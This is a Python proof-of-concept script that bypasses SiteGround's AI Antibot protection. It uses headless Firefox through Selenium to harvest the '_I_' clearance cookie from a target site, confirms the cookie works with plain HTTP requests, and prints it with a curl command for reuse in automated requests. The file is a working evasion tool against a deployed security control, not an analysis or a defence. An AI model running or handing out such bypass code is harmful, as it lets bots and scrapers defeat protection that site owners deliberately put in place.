import shutil
import sys
import argparse

import requests
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.ui import WebDriverWait

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
)


def parse_args():
    parser = argparse.ArgumentParser(description="PoC that bypasses SiteGround AI Antibot protection")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-ua", "--user-agent", default=DEFAULT_USER_AGENT, help="Custom User-Agent string")
    parser.add_argument("--geckodriver", help="Path to geckodriver binary")
    return parser.parse_args()


def resolve_geckodriver(path=None):
    resolved = path or shutil.which("geckodriver")
    if not resolved:
        sys.exit(
            "geckodriver not found. Download it from "
            "https://github.com/mozilla/geckodriver/releases/ "
            "or pass --geckodriver /path/to/geckodriver"
        )
    return resolved


def fetch_cookie(target, user_agent, geckodriver_path):
    options = Options()
    options.add_argument("--headless")
    options.set_preference("general.useragent.override", user_agent)

    driver = webdriver.Firefox(options=options, service=Service(geckodriver_path))
    try:
        driver.get(target)
        WebDriverWait(driver, 30).until(lambda d: d.get_cookie("_I_") is not None)
        return driver.get_cookie("_I_")["value"]
    finally:
        driver.quit()


def verify_cookie(target, user_agent, cookie):
    response = requests.get(
        target,
        headers={"User-Agent": user_agent},
        cookies={"_I_": cookie},
        timeout=15,
    )
    return response.status_code == 200


def main():
    args = parse_args()
    geckodriver_path = resolve_geckodriver(args.geckodriver)

    print(f"Fetching cookie for target: {args.target} with User-Agent: {args.user_agent}")

    try:
        cookie = fetch_cookie(args.target, args.user_agent, geckodriver_path)
    except Exception as e:
        sys.exit(f"Failed to retrieve _I_ cookie: {e}")

    print("Verifying cookie...\n")

    try:
        valid = verify_cookie(args.target, args.user_agent, cookie)
    except (requests.exceptions.InvalidSchema, requests.exceptions.MissingSchema):
        sys.exit("Invalid target URL.")
    except requests.exceptions.ConnectionError:
        sys.exit("Failed to connect to target.")
    except requests.exceptions.Timeout:
        sys.exit("Request timed out.")

    if valid:
        print(
            f"Valid Cookie ID and User-Agent\n\n"
            f"Use in your future requests:\n"
            f"  Cookie:     _I_={cookie}\n"
            f"  User-Agent: {args.user_agent}\n\n"
            f"Example:\n"
            f'  curl -I "{args.target}" -H "Cookie: _I_={cookie}" -H "User-Agent: {args.user_agent}"'
        )
    else:
        sys.exit("Invalid Cookie ID or User-Agent.")


if __name__ == "__main__":
    main()
